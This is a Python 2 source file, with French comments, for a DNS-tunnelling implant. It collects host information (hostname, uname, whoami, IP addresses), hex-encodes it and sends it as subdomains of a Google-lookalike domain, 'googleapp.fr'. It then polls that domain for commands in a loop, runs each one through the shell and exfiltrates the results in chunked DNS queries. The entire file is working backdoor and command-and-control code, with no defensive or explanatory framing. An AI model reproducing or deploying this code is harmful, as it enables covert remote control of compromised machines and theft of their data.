#!/usr/bin/env python

from dnslib import A, AAAA, CNAME, MX, RR, TXT
from dnslib import DNSHeader, DNSRecord, QTYPE, DNSQuestion
import string
import random
import subprocess
import time

server = '8.8.8.8'
port = 53


class dns_client:

	def random(self,taille): # une taille de 5 permet plus de 50 millions de possibilites
		s=string.lowercase+string.digits
		rep = ''.join(random.sample(s,taille))
		return rep

	def get_an_id(self):
		info = 'hostname && uname && whoami && hostname -I'
		self.process = subprocess.check_output(info,shell=True)
		print self.process.encode('hex')
		chunks, chunk_size = len(self.process.encode('hex')), 40 # division de la reponse encoded en chunk de 62 
		data = [ self.process.encode('hex')[i:i+chunk_size] for i in range(0, chunks, chunk_size) ]
		str1 = '.'.join(data)		
				
		q = DNSRecord(q=DNSQuestion("NEW."+str1+'.'+self.random(5)+".googleapp.fr",QTYPE.TXT))
		a_pkt = q.send(server,port,tcp=False)
		a = DNSRecord.parse(a_pkt)
		self.implant_id = a.short()
		self.implant_id = self.implant_id.strip('\"')
		print("IMPLANT ID : %s" % self.implant_id)
		
	def check_for_cmd(self):
		q = DNSRecord(q=DNSQuestion(self.implant_id+'.TOPO.'+self.random(5)+".googleapp.fr",QTYPE.TXT))
		a_pkt = q.send(server,port,tcp=False)
		a = DNSRecord.parse(a_pkt)		
		
		self.commande = a.short()
		self.commande = self.commande.strip('\"')
		print self.commande
		if self.commande == 'DODO':
			print "Aucune commande a exec, faire dodo 60sec"
		if self.commande != 'DODO':
			print "commande arrive"
			try:			
				self.process = subprocess.check_output(self.commande,shell=True)
				print self.process
				self.send_reponse(self.process)
			except:
				pass

	def send_reponse(self,reponse): # pas plus de 63 byte par sousdomaine et 255 en tout, encoder en UPPER apres pour eviter error en transit
		encoded_reponse = reponse.encode('hex')
		print encoded_reponse, len(encoded_reponse) 
		
		chunks, chunk_size = len(encoded_reponse), 62 # division de la reponse encoded en chunk de 62 
		data = [ encoded_reponse[i:i+chunk_size] for i in range(0, chunks, chunk_size) ]
		str1 = '.'.join(data)
		
		print data
		print str1 
		print len(str(self.implant_id)+'.start.'+str(self.random(5))+'.googlemap.fr'+str(encoded_reponse))

		if len(str(self.implant_id)+'.start.'+str(self.random(5))+'.googlemap.fr'+str(encoded_reponse)) < 255:		
			q = DNSRecord(q=DNSQuestion(self.implant_id+'.START.'+self.random(5)+".googleapp.fr",QTYPE.A))
			a_pkt = q.send(server,port,tcp=False)
			q = DNSRecord(q=DNSQuestion(self.implant_id+'.BODY.'+str1+'.'+self.random(5)+".googleapp.fr",QTYPE.A))
			a_pkt = q.send(server,port,tcp=False)
			q = DNSRecord(q=DNSQuestion(self.implant_id+'.END.'+self.random(5)+".googleapp.fr",QTYPE.A))
			a_pkt = q.send(server,port,tcp=False)
		
		else:
			number_paquet = len(data)/3
			print number_paquet
			q = DNSRecord(q=DNSQuestion(self.implant_id+'.STARTFF.'+str(number_paquet)+'.'+self.random(5)+".googleapp.fr",QTYPE.A))
			a_pkt = q.send(server,port,tcp=False)
			for i in range(0,number_paquet*3,3):
				str1 = '.'.join(data[i:i+3])
				print str1			
				q = DNSRecord(q=DNSQuestion(self.implant_id+'.FFBODY.'+str(i)+'.'+str1+'.'+self.random(5)+".googleapp.fr",QTYPE.A))
				a_pkt = q.send(server,port,tcp=False)
			
			q = DNSRecord(q=DNSQuestion(self.implant_id+'.END.'+self.random(5)+".googleapp.fr",QTYPE.A))
			a_pkt = q.send(server,port,tcp=False)

			
dns = dns_client()
plop = dns.get_an_id()
while True:
	cmd = dns.check_for_cmd()
	time.sleep(10)



      

